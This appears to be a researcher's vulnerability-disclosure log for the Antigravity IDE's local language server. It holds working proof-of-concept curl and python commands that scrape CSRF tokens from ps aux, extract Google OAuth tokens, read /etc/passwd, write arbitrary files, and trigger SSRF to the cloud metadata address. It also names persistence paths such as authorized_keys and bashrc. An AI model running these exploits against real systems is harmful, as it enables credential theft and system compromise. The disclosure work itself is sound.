# Antigravity Server-Side Findings — Session 2
## Date: 2026-04-04

---

## Summary of New Bugs Found

### Bug 12: OAuth Access Token Leaked via GetUnleashData RPC
**Severity: High**
**Type: Credential Disclosure**

The `GetUnleashData` RPC on the LanguageServerService returns the user's Google OAuth access token (`ya29.*`) in plaintext, embedded in the `userId` field of the Unleash feature flag context.

**Attack chain:**
1. Any local process reads CSRF token from `ps aux` output (`--csrf_token` flag)
2. Calls `GetUnleashData` on `https://127.0.0.1:{port}/exa.language_server_pb.LanguageServerService/GetUnleashData`
3. Extracts `ya29.*` token from `context.userId` field
4. Token grants access to Google Cloud Platform with scopes: `cloud-platform`, `userinfo.email`, `userinfo.profile`, `cclog`, `experimentsandconfigs`

**POC:**
```bash
# Get CSRF token from ps aux
CSRF=$(ps aux | grep language_server | grep -o 'csrf_token [^ ]*' | head -1 | cut -d' ' -f2)
PORT=$(ps aux | grep language_server | grep -o 'extension_server_port [0-9]*' | head -1 | cut -d' ' -f2)
# Note: LanguageServerService is on port $PORT+1 (HTTPS) or $PORT+2 (HTTP)

# Create gRPC-Web+JSON envelope
python3 -c "
import json, struct, sys
body = json.dumps({})
envelope = struct.pack('>BI', 0, len(body)) + body.encode()
sys.stdout.buffer.write(envelope)
" > /tmp/req.bin

# Call GetUnleashData
curl -sk "https://127.0.0.1:$((PORT+1))/exa.language_server_pb.LanguageServerService/GetUnleashData" \
  -H 'Content-Type: application/grpc-web+json' \
  -H "x-codeium-csrf-token: $CSRF" \
  -H 'x-grpc-web: 1' \
  --data-binary @/tmp/req.bin | strings | grep -o 'ya29\.[A-Za-z0-9_.-]*'
```

**Response:**
```json
{
  "context": {
    "userId": "ya29.a0Aa7MYioJB1pCRkB-yTvPVstpB5b8hn8QIQ4ZGJ...(260 chars)",
    "properties": {
      "devMode": "false",
      "ide": "antigravity",
      "installationId": "4ce42961-..."
    }
  }
}
```

**Note:** The token may be stale (set at initialization). Fresh tokens are stored in Electron's safeStorage. The vulnerability is that the token is exposed at all — during active sessions, the token will be valid.

---

### Bug 13: Arbitrary File Read via ReadFile RPC
**Severity: High**  
**Type: Path Traversal / Information Disclosure**

The `ReadFile` RPC reads any file on the filesystem with no path validation. Not restricted to workspace.

**POC:**
```bash
python3 -c "
import json, struct, sys
body = json.dumps({'uri': 'file:///etc/passwd'})
envelope = struct.pack('>BI', 0, len(body)) + body.encode()
sys.stdout.buffer.write(envelope)
" | curl -sk "https://127.0.0.1:62236/exa.language_server_pb.LanguageServerService/ReadFile" \
  -H 'Content-Type: application/grpc-web+json' \
  -H 'x-codeium-csrf-token: 77ba639d-...' \
  -H 'x-grpc-web: 1' --data-binary @-
```

**Response:** Full file contents as base64 in `{"content":"..."}`.

**Files confirmed readable:**
- `/etc/passwd` ✓
- `/etc/hosts` ✓
- Any file accessible by the user

---

### Bug 14: Arbitrary File Write via WriteFile RPC
**Severity: Critical**
**Type: Arbitrary File Write**

The `WriteFile` RPC writes arbitrary content to any path. No workspace restriction.

**POC:**
```bash
python3 -c "
import json, struct, sys, base64
body = json.dumps({
    'uri': 'file:///tmp/proof.txt',
    'content': base64.b64encode(b'Arbitrary write proof').decode()
})
envelope = struct.pack('>BI', 0, len(body)) + body.encode()
sys.stdout.buffer.write(envelope)
" | curl -sk "https://127.0.0.1:62236/exa.language_server_pb.LanguageServerService/WriteFile" \
  -H 'Content-Type: application/grpc-web+json' \
  -H 'x-codeium-csrf-token: 77ba639d-...' \
  -H 'x-grpc-web: 1' --data-binary @-
```

**Impact:**
- Write to `~/.ssh/authorized_keys` → SSH access
- Write to `~/.bashrc` or `~/.zshrc` → persistent code execution
- Write to crontab files → scheduled code execution
- Overwrite application binaries or scripts

---

### Bug 15: Client-Side SSRF via UpdateEnterpriseExperimentsFromUrl
**Severity: Medium**
**Type: SSRF (Client-Side)**

The `UpdateEnterpriseExperimentsFromUrl` RPC fetches any URL from the language server with no validation.

**POC:**
```bash
python3 -c "
import json, struct, sys
body = json.dumps({'portalUrl': 'http://169.254.169.254/latest/meta-data/'})
envelope = struct.pack('>BI', 0, len(body)) + body.encode()
sys.stdout.buffer.write(envelope)
" | curl -sk "https://127.0.0.1:62236/exa.language_server_pb.LanguageServerService/UpdateEnterpriseExperimentsFromUrl" \
  -H 'Content-Type: application/grpc-web+json' \
  -H 'x-codeium-csrf-token: 77ba639d-...' \
  -H 'x-grpc-web: 1' --data-binary @-
```

**No URL validation:** file://, gopher://, hex IPs, decimal IPs, 0.0.0.0 — all accepted and fetched.
**User-Agent:** `Go-http-client/1.1`

---

### Bug 16: ExecuteCommand RCE with Correct Field Names
**Severity: Critical** (same as Bug 11, but with refined details)

The `ExecuteCommand` RPC on ExtensionServerService executes shell commands.

**Key details discovered:**
- Service path: `/exa.extension_server_pb.ExtensionServerService/ExecuteCommand`
- Served on the language server HTTPS port (62236), NOT just the extension server port
- Uses `extension_server_csrf_token` (also leaked in `ps aux`)
- Field name: `commandLine` (not `command`)
- Returns streaming response with terminal header, data chunks, and trailer
- CWD defaults to workspace directory

---

### Bug 17: PII Disclosure via GetUserStatus
**Severity: Low**
**Type: Information Disclosure**

`GetUserStatus` returns full user profile without additional auth:
- Full name
- Email address
- Plan tier and billing details
- Available credits
- Model configuration
- Team settings

---

## Attack Chain Summary

**Chain 1: Full Local System Compromise**
```
ps aux → CSRF tokens → ReadFile (read any file) + WriteFile (write any file) + ExecuteCommand (shell access)
```

**Chain 2: OAuth Token Theft**
```
ps aux → CSRF token → GetUnleashData → ya29.* OAuth token → Google Cloud access
```

**Chain 3: Internal Network Reconnaissance**
```
ps aux → CSRF token → UpdateEnterpriseExperimentsFromUrl → fetch internal URLs → SSRF
```

---

## Port Map (Authenticated Instance, PID 37871)

| Port  | Protocol | Service | CSRF Required |
|-------|----------|---------|---------------|
| 62235 | HTTP     | Extension host (Node.js) | extension_server_csrf |
| 62236 | HTTPS    | LanguageServerService + ExtensionServerService | csrf_token (LS) / extension_server_csrf_token (ES) |
| 62237 | HTTP     | LanguageServerService (plaintext gRPC) | csrf_token |
| 62245 | TCP      | LSP | N/A |
| 62258 | HTTP     | MCP SSE (JSON-RPC) | SSE session |

---

## Methods Successfully Called on LanguageServerService

| Method | Status | Notes |
|--------|--------|-------|
| WellSupportedLanguages | ✓ | Returns language list |
| GetUserTrajectoryDebug | ✓ | Returns cascadeId, workspace URIs |
| GetCascadeModelConfigs | ✓ | Returns empty config |
| StartCascade | ✓ | Creates new cascade, returns cascadeId |
| SendUserCascadeMessage | ✗ | INTERNAL_ERROR (HTTP/2 RST_STREAM) |
| HandleStreamingCommand | ✗ | "unexpected request source" |
| GetUserStatus | ✓ | **PII: name, email, plan, credits** |
| GetProfileData | ✓ | Profile picture (base64) |
| GetDebugDiagnostics | ✓ | **Server logs with URLs and traces** |
| GetUnleashData | ✓ | **OAuth token in userId field** |
| GetStaticExperimentStatus | ✓ | Feature flags |
| GetCascadeNuxes | ✓ | NUX data with Google blog URLs |
| ReadFile | ✓ | **Arbitrary file read (no path validation)** |
| WriteFile | ✓ | **Arbitrary file write (no path validation)** |
| ReadDir | ✓ | **Directory listing (no path validation)** |
| UpdateEnterpriseExperimentsFromUrl | ✓ | **SSRF (client-side, no URL validation)** |
| ExecuteCommand (ExtensionServerService) | ✓ | **RCE via commandLine field** |

---

## Session 3: Backend API Testing Results (2026-04-04)

### Token Obtained
- Used `Restart` RPC to force token refresh → `GetUnleashData` returns fresh `ya29.*` token
- Token scopes: `email profile cloud-platform cclog experimentsandconfigs userinfo.email userinfo.profile openid`
- OAuth client ID: `1071006060591-tmhssin2h21lcre235vtolojh4g403ep.apps.googleusercontent.com`
- GCP project: `handy-lodge-7d7ql` (auto-provisioned, `gcpManaged: false`)

### Endpoints Tested on `daily-cloudcode-pa.googleapis.com`

| Endpoint | Result | Notes |
|----------|--------|-------|
| `fetchUserInfo` | ✓ | Returns telemetry + region |
| `loadCodeAssist` | ✓ | **Leaks**: GCP project, tier, email, upgrade URLs |
| `retrieveUserQuota` | ✓ | Quota buckets for gemini models |
| `listExperiments` | ✓ | 71 experiment IDs + feature flags (see below) |
| `generateChat` | ✓ | Works, but RAG_DISABLED, no URL fetching |
| `streamGenerateChat` | ✓ | Same as generateChat, streaming |
| `internalAtomicAgenticChat` | ✓ | Returns `{}` without project, untested with |
| `searchSnippets` | ✓ | Returns `{}`, scoped to own project |
| `onboardUser` | ✓ | Accepted `standard-tier` but **no tier change** |
| `setUserSettings` | ✓ | Modifies own settings only |
| `setCodeAssistGlobalUserSetting` | ✓ | Sets `freeTierDataCollectionOptin` |
| `fetchAdminControls` | ✓ | Returns `{}` (no admin controls) |
| `checkUrlDenylist` | ✓ | Returns `{}` always — static check, no fetch |
| `rewriteUri` | ✓ | Returns `{}` always — no fetch |
| `generateContent` | ✗ | 400 INVALID_ARGUMENT |
| `fetchAvailableModels` | ✗ | 403 PERMISSION_DENIED |
| `listModelConfigs` | ✗ | 400 (field name unknown) |
| `transformCode` | ✗ | 400 needs params |
| `listCloudAICompanionProjects` | ✗ | 404 |
| `listRemoteRepositories` | ✗ | 404 |
| `tabChat` | ✗ | 404 |

### SSRF Testing (all negative)
- `generateChat` with URLs in `userMessage` — model says "I can't browse"
- `generateChat` with `ideContext.remoteRepositories` — accepted but not fetched
- `generateChat` with `ideContext.currentFile.repository.repositoryUri` — not fetched
- `checkUrlDenylist` / `rewriteUri` — static checks, no server-side fetch
- RAG status always `RAG_DISABLED` despite `DuetAiRemoteRag__enable_remote_rag: true`

### IDOR Testing (all negative)
- `generateChat` with different `project` — IAM blocks: `PERMISSION_DENIED`
- GCP APIs (compute, storage, IAM, CRM) — all disabled or PERMISSION_DENIED
- No cross-project data access found

### Notable Feature Flags
- `DuetAiRemoteRag__enable_remote_rag: true` (but RAG_DISABLED in responses)
- `DuetAiLocalRag__enable_local_rag: true`
- `Chat__enable_chat_agentic_mcp_chat: false`
- `GeminiFreeTier__enable_free_tier: false`

### Binary Analysis
- Second OAuth client ID: `884354919052-36trc1jjb3tguiac32ov6cod268c5blh.apps.googleusercontent.com`
- RSA testing key (not production): `MIIEvg...` with `-----END RSA TESTING KEY-----`
- Internal Google URLs: `buganizer.corp.google.com`, `moma.corp.google.com` (informational only)
- `metadata.google.internal` referenced in code (expected for GCP awareness)

### Conclusion
**Google backend API is well-secured.** No server-side vulnerability found:
- Proper IAM controls prevent cross-project access
- Chat/RAG endpoints don't fetch arbitrary URLs
- Tier escalation blocked server-side
- No embedded production secrets
- `cloud-platform` scope on OAuth token is unnecessarily broad but not exploitable

---

## Next Priority

1. **Write VRP reports for confirmed bugs** — prioritize by impact:
   - Bug 11/16: RCE via ExecuteCommand (CRITICAL)
   - Bug 13+14: Arbitrary file read/write (CRITICAL)
   - Bug 12: OAuth token leak with cloud-platform scope (HIGH)
   - Bug 6+9: Marketplace override + disabled signature verification (MEDIUM)
2. **Consider consolidating** into one comprehensive report showing the full attack chain:
   `ps aux` → CSRF tokens → ReadFile/WriteFile/ExecuteCommand + OAuth token theft
